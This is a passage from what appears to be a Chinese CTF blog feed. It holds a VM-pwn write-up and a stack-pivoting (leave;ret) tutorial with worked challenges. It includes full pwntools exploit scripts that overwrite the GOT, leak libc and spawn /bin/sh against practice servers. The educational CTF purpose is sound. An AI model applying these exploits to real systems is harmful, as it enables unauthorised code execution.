src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052303350.png" alt="image-20221205230302286"></p><p>结合上图来说，(get函数)就是从第一个参数中取一个数据放置到v6中，从而识别出不同指令。</p><h5 id="push函数">push函数</h5><p>接着是push函数，从函数引用这里看出push函数需要一个stack的地址和data地址(如下)</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052306158.png" alt="image-20221205230636113"></p><p>进入内部的话是依次调用了这两个函数，前者是上面分析过的get函数，将data段里的一个数据取出来给v3，而第二个函数是将v3的值赋值给stack，具体内部实现的过程就不放了，因为我分析的不是十分透彻，<strong>我主要是通过动态调试观察函数执行前和执行后stack data text以及寄存器里的变化得出来每个函数的作用</strong></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052307117.png" alt="image-20221205230703076"></p><h5 id="add函数">add函数</h5><p>然后是add函数，内部是用了两个get连续从stack里面取两次数据，相加后覆盖了第一个操作数将其放回。</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052309678.png" alt="image-20221205230944629"></p><h5 id="save函数">save函数</h5><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052311263.png" alt="image-20221205231132218"></p><p>发现就一个参数stack(注意这个stack是控制堆块的地址，而控制堆块里存放的地址才是真正指向stack的)</p><p>内部实现如下，先是从stack里取了两个数据，红框里才是最重要的部分，简单分析一下，*(stack+12)是stack中存储元素的个数，再加v2(可控)的值乘以8加上*stack(*stack就是真正stack的地址，而本来的stack是控制堆块的地址)得到最后的地址，save函数就是将v3的值写入最后这个地址里。</p><p>很明显v2是可控的，因此可以利用*stack加上一个可控偏移来实现任意数据写入</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052313057.png" alt="image-20221205231309007"></p><h5 id="load函数">load函数</h5><p>load函数与save函数相反，它的漏洞最后可以利用为从任意地址读出数据放入栈中(如下)，同样是因为v2可控，这样可以利用*stack加上可控偏移将任意地址(前提是任意地址和*stack存在固定偏移)中的数据读入到栈中</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052320237.png" alt="image-20221205232048187"></p><h3 id="利用思路-v2">利用思路</h3><p>综上所述，我们考虑劫持puts的got表为system地址。先将puts的地址用load读入到stack中再用add函数加上一定的偏移得到system的地址，再利用save函数将system的地址写入到puts的got表。</p><p>调试过程如下：</p><p>下图为正常情况下stack与其控制堆块的关系，可以很明显的看到控制堆块里存放的是stack的指针，如果我们想去篡改got表，第一件事就是要将这个地址修改成got地址附件的地址。</p><blockquote><p>能否直接将控制堆块中存放的地址修改为puts的got地址?</p><p>不能，如果修改后的话，*(stack+12)就会拿到一个超级大的值被当做索引(而这个超级大的值实际上是函数的真实地址)，需要注意的是控制堆块中的地址决定了stack位于何处，如果更改为puts的got地址后，之后的push操作则会对各个函数的got表进行破坏，并且*(stack+12)也会因为过大导致程序崩溃</p></blockquote><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052324075.png" alt="image-20221205232444875"></p><p>所以我们得先把stack迁移到got表附近，这里我迁移到了0x4040d0，这里正好位于了got表的下方(如下图)，并且这个地方正好都是内存为0，当做一个新的stack再好不过。</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052330226.png" alt="image-20221205233023770" style="zoom:50%;" /><p>此时新的stack位于got表下方，我们push进来新的索引，让其为负数，这样就能通过新的stack访问到got表中的数据，将其写到新的stack</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052332630.png" alt="image-20221205233223457"></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052333469.png" alt="image-20221205233335216"></p><p>最后执行一次save函数将system的地址写回puts的got表即可</p><h3 id="EXP-v2">EXP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:25001&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your program name:\n&quot;</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">debug(p,<span class="number">0x4019E2</span>,<span class="number">0x401A75</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your instruction:\n&quot;</span>,<span class="string">&quot;push push save push load push add push save&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your stack data:\n&quot;</span>,<span class="string">&quot;4210896 -3 -21 -172800 -21&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052338726.png" alt="image-20221205233853481"></p><h2 id="参考文章">参考文章</h2><p><a href="https://www.anquanke.com/post/id/208450#h2-0">VM Pwn学习-安全客 - 安全资讯平台 (anquanke.com)</a></p><p><a href="https://blog.csdn.net/A951860555/article/details/117214601">(44条消息) OGeek_2019_Final OVM题解___lifanxin的博客-CSDN博客</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vm pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于栈迁移的学习总结</title>
      <link href="/posts/ee1dcd7f.html"/>
      <url>/posts/ee1dcd7f.html</url>
      
        <content type="html"><![CDATA[<h1>1、什么是栈迁移</h1><p>这里我谈谈自己的理解，简单一句话：<strong>栈迁移就是换个地方控制程序的执行流</strong>（这个换的地方既可以是bss段也可以是栈里面）。</p><h1>2、为什么要使用栈迁移&amp;&amp;什么时候该使栈迁移（使用栈迁移的条件）</h1><p>言简意赅的来说，就是可溢出的长度不够用，也就是说我们要么是没办法溢出到返回地址只能溢出覆盖ebp，要么是刚好溢出覆盖了返回地址但是受payload长度限制，没办法把参数给写到返回地址后面。总之呢，就是能够溢出的长度不够，没办法GetShell，所以我们才需要换一个地方GetShell。</p><p>使用栈迁移的条件：</p><p>1、要能够栈溢出，这点尤其重要，最起码也要溢出覆盖个ebp</p><p>2、需要有个可写的地方（就是你要GetShell的地方），先考虑bss段，最后再考虑写到栈中</p><h1>3、学习栈迁移需要自身掌握什么知识</h1><pre><code>①需要掌握汇编基础②较为熟悉栈结构③以及明白函数调用与结束时栈的变化</code></pre><p>PS：本文讨论的一切原理，都是针对于32位程序的栈迁移来说的，不过例题里面有一道是64位的栈迁移</p><h1>4、栈迁移的原理</h1><h3 id="font-color-red-ebp和ebp的内容是两码事（它们二者的关系就如同c语言中-指针p与-p的关系）-font"><font color=red>ebp和ebp的内容是两码事（它们二者的关系就如同c语言中,指针p与*p的关系）</font></h3><p><img src="../img/2706180-20220118102346730-1500206355.png" alt=""></p><p>ebp是0xffe7a9e8，它的内容是0xffe7aa38，而这个内容也是一个地址，这个地址里面装的又是0x8059b50。<u>ebp本身大部分时候都是一个地址（程序正常运行情况下），而ebp的内容可以是地址，也可以不是地址（程序正常运行下，ebp的内容也装的是地址，但如果你进行溢出的话，自然可以不装成地址）</u>。我这里想强调的是ebp和ebp的内容这两者一定不能混为一谈，在阅读下面的内容是，一定要注意区分两者。</p><h2 id="栈迁移的核心，就在于两次的leave-ret指令上面"><strong>栈迁移的核心，就在于两次的leave;ret指令上面</strong></h2><h3 id="在说明栈迁移原理之前，我先介绍一下leave和ret具体是在干什么，这里建议仔细看一下，不然后面连续两个leave-ret，容易搞迷了）。">(在说明栈迁移原理之前，我先介绍一下leave和ret具体是在干什么，这里建议仔细看一下，不然后面连续两个leave;ret，容易搞迷了）。</h3><p>leave指令即为mov esp ebp;pop ebp先将ebp赋给esp，此时esp与ebp位于了一个地址，你可以现在把它们指向的那个地址，即当成栈顶又可以当成是栈底。然后pop ebp，将<strong>栈顶的内容</strong>弹入ebp<font color=red>（此时栈顶的内容也就是ebp的内容，也就是说现在把ebp的内容赋给了ebp）</font>。因为esp要时刻指向栈顶，既然栈顶的内容都弹走了，那么esp自然要往下挪一个内存单元。具体实现请见下图。<font color=red><strong>ps:下面几张图片，当时制作的时候，有点粗心，把leave写成level了，因此读的时候注意下这里就好了。</strong></font></p><p><img src="../img/2706180-20220118102443458-1381923387.png" alt=""></p><pre><code>ret指令为pop eip，这个指令就是把栈顶的内容弹进了eip（就是下一条指令执行的地址）具体实现请见下图。</code></pre><p><img src="../img/2706180-20220118102755803-79970067.png" alt=""></p><h2 id="栈迁移原理：">栈迁移原理：</h2><p><strong>（先讨论main函数里的栈迁移）<strong>首先</strong>利用溢出把ebp的内容</strong>给修改掉（<strong>修改成我们要迁移的那个地址</strong>），并且<strong>把返回地址填充成leave;ret指令的地址（因为我们需要两次leave;ret）</strong>（如果不会找指令地址的话，本文最后的附录中，有介绍）此时main函数准备结束。</p><p><font color=red>开始执行第一个leave</font>，此时mov esp ebp让两个指针处于同一位置，现在还是正常运行，接着执行pop ebp就出现了异常，<u>因为此时ebp的内容被修改成了要迁移的地址</u>，因此执行了pop ebp，ebp并没有弹到它本应该去的地方（正常情况下，ebp里装的内容，就是它接下来执行pop ebp要去的地方），<u>而是弹到了我们修改的那个迁移后的地址</u>，接着执行了pop eip，eip里放的又是leave的地址（因为此时是把返回地址弹给eip，这个返回地址，我们先给覆盖成leave;ret的地址。<font color=red>你可能会问，如果这个返回地址不放成leave；ret的地址，行不行？很明显是不行的，因为我们想要实现栈迁移，就必须执行两个leave；ret，main函数正常结束，只有一个level;ret，因此我们在这里必须要它的返回地址写成leave;ret地址，以来进行第二次leave;ret</font>），结果又执行了leave<font color=red>（现在执行第二个leave)</font>，此时才是到了栈迁移的核心部分，<strong>mov esp ebp，ebp赋给了esp，此时esp挪到了ebp的位置，可你别忘了，现在的ebp已经被修改到了我们迁移后的地址，因此现在esp也到了迁移后的地址，接着pop ebp，把这个栈顶的内容弹给ebp，esp指向了下一个内存单元，此时我们只需要将这个内存单元放入system函数的地址，最后执行了pop eip，此时system函数进入了eip中，我们就可以成功GetShell了</strong>。结合描述过程与下图分析，效果更佳！（下图栈中填充的aaaa以及system_addr和/bin/sh等等，都是payload一起发送过去的，最后的两个aaaa仅仅是起到了一个填充的效果）当然，具体的payload都是根据题目来分析的，这里我只是举个例子。</p><p><img src="../img/2706180-20220118102850680-2070302005.png" alt=""></p><p><img src="../img/2706180-20220118103002284-1311363088.png" alt=""></p><p>最后来总结一下原理，核心是利用两次的leave;ret，<strong>第一次leave ret;将ebp给放入我们指定的位置（这个位置的就是迁移后的所在位置）</strong>，<strong>第二次将esp也迁移到这个位置，并且pop ebp之后，esp也指向了下一个内存单元（此时这里放的就是system函数的plt地址）</strong>，最终成功GetShell。</p><p>原理如上，遇见不同栈迁移的题目也是根本核心万变不离其宗。</p><h1>5、栈迁移的实战运用</h1><p>接下来是有四道栈迁移的题目来练习。分别是</p><p>攻防世界上的greeting-150</p><p>BUUCTF上的[Black Watch 入群题]</p><p>BUUCTF上的ciscn_2019_es_2</p><p>BUUCTF上的gyctf_2020_borrowstack</p><p>它们考察了在迁移到栈，迁移到bss段，从main函数结束时迁移，从main函数调用的函数结束时迁移，和64位的栈迁移以及ret2csu。在这里，我分别也给出他们的wp。</p><hr><h2 id="BUUCTF上的ciscn-2019-es-2">BUUCTF上的ciscn_2019_es_2</h2><p><img src="../img/2706180-20220118103554143-806908519.jpg" alt=""><img src="../img/2706180-20220118103707874-2116954617.jpg" alt=""></p><p>这里我们发现了溢出点。Read读入到s的这个地方，距离ebp只有0x28个字节，可是两个read都可以写入0x30个字节的内容，也就是说可以溢出覆盖ebp和返回地址。</p><p><img src="../img/2706180-20220118103715766-1605737103.png" alt=""></p><p>我们还发现了后门函数，但是没有参数。</p><p><img src="../img/2706180-20220118120250348-503674972.jpg" alt=""></p><p>那现在大概思路就是，我们要用第一个read来泄露下ebp的地址***（因为是printf来打印字符串，参数是%s，因此是遇见00才停止打印，只要我们第一次read正好输入0x30个字符，那就没有地方在填上00了（read读入之后，会自动补充00），因此就可以把下面的ebp地址给打印出来了***），然后第二个read用来填充我们构造的system函数以及参数（我们这次是转移到了栈中，也就是第一次read读入s的地方），参数分布参考上图</p><p>为什么要拿到ebp地址呢，看上图的/bin/sh地址，我们怎么知道它的地址是什么呢，我们不知道，但是我们知道它距离ebp的偏移（通过IDA的栈图可以数出来），因此我们需要获得ebp的值，配合偏移来表达出这个地址，*<strong>这里要尤其注意这个ebp是main函数的，因为printf是打印内存单元里的内容，ebp确实是指向了vul的栈底，但是ebp里面装的内容可是main函数的栈底，因此这个ebp是main函数的栈底*</strong>。至于这个0x28怎么来的呢？</p><p>这里要用gdb调试一下，断点下到哪无所谓，主要就是要看vul函数快结束的时候，看下栈图。</p><p><img src="../img/2706180-20220118120659280-353618504.jpg" alt=""></p><p>当然，你实际做题的时候，肯定是看不见/bin/sh装到哪了，不过没事，在IDA里面我们分析一下，然后看一下它装在哪了，还是这个图，发现/bin/sh装在了距离栈顶是有四个内存单元的距离，然后再到gdb上去数一下，也就是我们的字符串会存到0xffd9d730这个位置，然后用0xffded758减去这个0xffd9d730，就能得到这个偏移0x28了。</p><p><img src="../img/2706180-20220118120250348-503674972.jpg" alt=""></p><p>最后的exp如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,25986)</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1=<span class="number">0x20</span>*<span class="string">&#x27;a&#x27;</span>+<span class="number">0x8</span>*<span class="string">&#x27;b&#x27;</span></span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">level_ret_addr=<span class="number">0x08048562</span></span><br><span class="line"></span><br><span class="line">sys_addr=e.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Welcome, my friend. What&#x27;s your name?\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload1)<span class="comment">#第一次仅仅就是为了泄露main函数的ebp</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ebp=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">payload2=(<span class="string">&#x27;aaaa&#x27;</span>+p32(sys_addr)+p32(<span class="number">0</span>)+p32(<span class="number">0xffd9d730</span>)+<span class="string">&#x27;/bin/sh&#x27;</span>).ljust(<span class="number">0x28</span>,<span class="string">&#x27;\x00&#x27;</span>)+p32(ebp-<span class="number">0x38</span>)+p32(level_ret_addr)<span class="comment">#这个ljust的意思是说不足0x28的部分补成00（也就是我在上图中标注的垃圾数据）这个0x38的偏移算法和上面那个0x28是相同的，这个地址是栈顶的地址，也就是我们payload中aaaa的地址，要用这个地址去覆盖ebp</span></span><br><span class="line"></span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><hr><h2 id="攻防世界上的greeting-150">攻防世界上的greeting-150</h2><p><img src="../img/2706180-20220118121000718-655614088.jpg" alt=""></p><p>这里表面上是看开了canary，但是在主要的函数中，没有发现canary的影子，因此，这个canary保护，在这里是有点迷惑性的，我们可以去溢出。</p><p><img src="../img/image-20221007101237565.png" alt="image-20221007101237565"></p><p>在上图中标注了，base64decode，是将解码后的内容放在了v4里面，而不是v6里面，v6里放的是解码后的字符串长度。</p><p>我之前看师傅们的wp一直纳闷，这输入的内容也没有被编码过，咋就到这里可直接就解码了，最后看到了exp才明白，原来是我们发送payload时候，我们自己去编码…，配合这个信息，我也就明白了，原来v6&gt;0xc的这个限制，是说我们payload只能发送12个字节。</p><p>执行了这句之后，我们的input里面放的也是解码之后的内容了（因为我们是要把payload编码之后发送，因此这里的input实际上就是我们的payload)<br><font color=red><br>现在input里面就是payload，这个payload只能发送12个字节</p></font><p>ok，我们继续去看auth这个函数。</p><p><img src="../img/image-20221007101316583.png" alt="image-20221007101316583"></p><p>找到了溢出点，在这里。[ebp-8h]的意思是说，这个v4距离ebp有八个字节的距离，可是input里面可以装12个字节，现在memcpy就可以把input的内容复制给了v4（这个v4和main函数里的v4不是一码事） 只能装8个字节，但是复制了12个字节过去，有什么好说的，溢出就完事了。但是只能溢出覆盖ebp，<font color=red><strong>之前栈迁移的时候，我们为了凑齐两次leave;ret都是将main函数的返回地址写成leave,ret的地址，但是这道题我们没法写到返回地址上，怎么办，我们没办法凑够两次leave;ret了么，不不不，别忘了我们现在可不在main函数还是在auth函数里面，当auth函数结束的时候也会执行一次leave;ret再加上main函数结束的一次leave;ret，因此我们也凑够了两次leave;ret。</strong></font></p><p>我们需要换到哪个地方去执行后门函数呢？没错，就是刚才说的input</p><p><img src="../img/image-20221007101341015.png" alt="image-20221007101341015"></p><p>这里也可以看到input是处于bss段的。</p><p>现在我们来看这道题，我们可以往input里面输入12个字节，那假设我输入的是aaaabbbbcccc，<font color=red>（并且这个cccc是aaaabbbbcccc这个字符串的首地址）。</font></p><p>那么现在栈里就是这么个情况<br><img src="../img/image-20221007101352060.png" alt="image-20221007101352060" style="zoom:50%;" /></p><p>当执行到leave的时候，mov esp ebp，此时的esp是cccc了，然后ebp原本该回到正常的main函数的栈底，可是现在它来到了cccc的这个地址（因为执行了auth函数中的leave ret，这里才是核心点）（并且要注意的是ebp内容和ebp是两个东西，ebp的内容装什么都可以，但是ebp本身只能去指向地址）（即此时是ebp指向了aaaa的地址，上面说了cccc的地址是指向的aaaa所处位置）。</p><p>现在程序继续运行，因为函数的返回地址是正常的，所以它还是回到了main函数里，它又开始往下运行，直到main函数结束了，它开始执行leave，那么此时我们又一次mov esp ebp；esp成了aaaa的地址，这个时候又进行了pop ebp，那么esp成了bbbb，最后到ret的时候，pop eip，此时就会把栈顶的bbbb，弹入eip去执行了。</p><p>如果感觉我说的太抽象了，没有图片的话，可以参考这个师傅的文章<a href="https://blog.csdn.net/weixin_43868725/article/details/108366539?ops_request_misc=%7B%22request%5Fid%22%3A%22164229926316780265467309%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=164229926316780265467309&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-108366539.first_rank_v2_pc_rank_v29&amp;utm_term=format2&amp;spm=1018.2226.3001.4187">(24条消息) format2(xctf)_whiteh4nd的博客-CSDN博客</a>，他这里面最后画的三张图片，描述的很清楚，我上面的叙述过程，跟他图片表达的是一个意思。</p><p>最后，我们拐过来看一下，eip执行了bbbb，那我们把bbbb换成后门函数的地址不就ok了，然后是cccc的这个地址，不就是我们这道题的input地址么，input本身能装12个字节，把它本身的地址写到cccc，就是12个字节的最后4字节，这样不就把栈迁移到input的内容里了么（但事实上栈没有过去，毕竟这里可是bss段）</p><p>Exp编写很简单</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="number">59650</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys_addr=<span class="number">0x08049284</span></span><br><span class="line"></span><br><span class="line">input_addr=<span class="number">0x0811EB40</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;aaaa&#x27;</span>+p32(sys_addr)+p32(input_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(base64.b64encode(payload))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>至此本题也就结束了。</p><p>但通过这道题，我学到了不少的东西。</p><p>尤其是这个函数</p><img src="../img/2706180-20220118123108947-994146250.jpg" alt="EJnn.jpg" border="0"><p>这里我一直是在想怎么把input写成这个-559038737，而忘记了其实不必循规蹈矩，因为没开pie，我们完全可以把这个system函数的地址去弄到eip里面使其执行。也认识到了找漏洞点的重要性，上来就去仔细分析函数的功能用处不大，大致扫过即可，先去找明显的漏洞点，在围绕这个漏洞点想一下，我们能利用它做些什么。</p><hr><hr><h2 id="BUUCTF上的-Black-Watch-入群题">BUUCTF上的[Black Watch 入群题]</h2><img src="../img/2706180-20220118123108942-1379753087.jpg" alt="E2mG.jpg" border="0"><pre><code>打开IDA发现，主程序中，buf距离栈底有0x18个字节，但是最后的一个read却可以读入0x20个字节，很明显这里存在溢出，但是吧，这个溢出的长度也是很尴尬的，我们确实可以填入system函数地址，但是这样就没办法传参数了，而且我们发现程序里也没有system函数，因此肯定还是要泄露函数地址，用libc里面的system获取shell。我们发现这里的溢出刚好可以覆盖ebp和返回地址，很明显这里要用栈迁移。然后我们再看下第一个read把输入的内容储存到哪了</code></pre> <img src="../img/2706180-20220118123108938-1447621027.jpg" alt="EfG9.jpg" border="0"><p>发现是存到了bss段。</p><p>那我们的思路大概就出来的，首先把在第一次输入中read去把write_plt的地址和它的参数存进去，因为我们想要system函数地址肯定是需要先泄露libc基地址的。然后第二次输入去把ebp给改成bss段的地址，然后把返回地址改成leave,ret地址（具体原因参考栈迁移原理）</p><p>然后程序从main函数返回的时候，被劫持到了bss段，去执行了write函数，泄露出来write函数的got地址，<strong>并且把它的返回地址填写成main函数</strong>，因为我们需要再让程序跑一次，毕竟我们最终可是要去执行system函数的，现在只是把libc基地址给泄露出来了而已。</p><p>现在执行完了write函数，然后返回到main函数重新获得了两次输入的机会，那么我们依然如法炮制，在第一次输入中存入system函数地址和它的参数，此时各单位以就位，就差了修改ebp了，然后来到了第二次输入，我们先填充垃圾数据，直到填充至ebp，然后把ebp的地址写成bss段的地址，还要把返回地址写成leave;ret的地址。</p><p>最后main函数返回的时候就进行了栈迁移，来到了我们步骤的bss段，然后执行system函数，成功GetShell。</p><p>以上只是介绍了本题的思路，但是没有探究原理，具体原理参考前面的栈迁移原理部分。</p><p>本题的exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27917</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">&#x27;./spwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=e.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">write_got=e.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">read_plt=e.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">main_addr=<span class="number">0x08048513</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">&#x27;aaaa&#x27;</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;What is your name?&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;What do you want to say?&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p32(<span class="number">0x0804A300</span>)+p32(<span class="number">0x08048511</span>) <span class="comment">#前面的是bss段地址，后面这个地址是level;ret地址</span></span><br><span class="line"></span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">write_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">obj=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line"></span><br><span class="line">libc_base=write_addr-obj.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys_addr=libc_base+obj.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bin_sh_addr=libc_base+obj.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;What is your name?&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload3=<span class="string">&#x27;aaaa&#x27;</span>+p32(sys_addr)+p32(<span class="number">0</span>)+p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">p.send(payload3)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;What do you want to say?&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload4=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p32(<span class="number">0x0804A300</span>)+p32(<span class="number">0x08048511</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload4)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这里有一个很重要的点，一定要注意，就是这里第二次输入的时候，必须要用send去发送，不能用sendline发送</p><p>下图的左侧是使用send发送了0x20个数据，右侧使用的是sendline发送了0x20个数据，可以发现，<em>右侧最后发送是多了一个回车</em>，此时程序本来是正常要发送一句hello good ctfer!what is you name?然后会等待用户发送一个内容，然后显示what you want to，左侧的确是这样，但右侧直接what is you name?之后把what you want to给打印出来了，也就根本没有让用户输入内容，为什么？<strong>因为sendline多出来的回车，存放到了缓冲区里面，下次输入的时候，程序直接就把缓冲区里的内容读进去了，发现是个回车，程序认为你的输入已经结束了，因此就打印了what you want to，事实上你根本就还没输入。</strong></p><p>由此可见，在任何时候发送数据，选择sendline时，都需谨慎。<br><img src="../img/2706180-20220118123108958-93341427.jpg" alt="EkPq.jpg" border="0"></p><h2 id="BUUCTF上的gyctf-2020-borrowstack">BUUCTF上的gyctf_2020_borrowstack</h2><p>这道题，不知道什么原因，用远程的exp是打不通本地的。因此这里我远程和本地的wp分别写了一份。二者的前面是一模一样的（但是后面的思路是不一样的），如果看过其中一份，那么另一份前面的内容跳过即可。<br>###打远程的WP</p><p><img src="../img/2706180-20220206163044818-1824898636.png" alt=""><br><img src="../img/2706180-20220206163110657-718675687.png" alt=""></p><p>主程序很简单，也发现了溢出点在第一次输入上，read读入buf的时候，可以溢出16个字节，也就是溢出两个内存单元的内容。</p><p><img src="../img/2706180-20220206163137949-2023688181.png" alt=""></p><p>可以发现，我们仅仅能控制rbp和返回地址。并且第二次输入的bank，输入到了bss段</p><p><img src="../img/2706180-20220206163202729-1115577905.png" alt=""></p><p>那我们就可以考虑栈迁移，把需要构造的payload转移到bss段。同时也没有发现后门函数和/bin/sh参数。</p><p>我们先说一下正常的思路。之前讲过了栈迁移的原理，因此我们第一次的read肯定是前面填充垃圾数据，然后把rbp填充成我们要迁移的地址，然后返回地址写一个level;ret指令的地址。然后第二次输入到bss段去构造我们的payload。因为我们没有后门函数，那只能去泄露一个函数地址，然后去动态库里面找后门函数，接着把返回地址填写成main函数的地址，然后再来一次栈迁移，去构造获取shell的payload。</p><p>但是这道题有好几个地方需要去注意。首先是我们看一下写入bss段地址。</p><p><img src="../img/2706180-20220206163247051-126352913.png" alt=""></p><p><img src="../img/2706180-20220206163309124-364277226.png" alt=""></p><p>发现了got表离这个bss段地址是很近的，因为我们要把栈迁移到bss段，就是可以把这个bss段给看成栈了，我们会在这个“栈”里面调用puts函数去泄露函数地址，但是调用puts的时候会开辟新的栈帧从而改变地址较低处的内容（不仅仅是got表，还有FILE *stdout和FILE *stdin），导致程序崩溃。这里光说的话，比较抽象，我在这里详细讲一下。</p><p>因为这里的地址0x601060存放的是stdout指针，然后等到返回main函数之后又会执行setbuf(stdout, 0LL);可是因为这个0x601060距离我们迁移到的bss段这里太近了（我们迁移到的地址是0x601080），当执行put函数的时候执行了一次sub rsp 0x18,并且还执行了多次的push，此时的0x601060已经被覆盖成别的内容了具体情况参考下面的图【1】和图【2】<br><img src="../img/2706180-20220206163334765-1162997865.png" alt=""></p><p><img src="../img/2706180-20220206163343356-1256253278.png" alt=""></p><p>​               图【1】</p><p><img src="../img/2706180-20220206163355949-1171818220.png" alt=""></p><p>​图【2】</p><p>可以看见这两张图片，都因为调用了puts函数，从而影响了栈的变化，修改了stdout指针。等到返回main函数的时候，执行了setbuf(stdout, 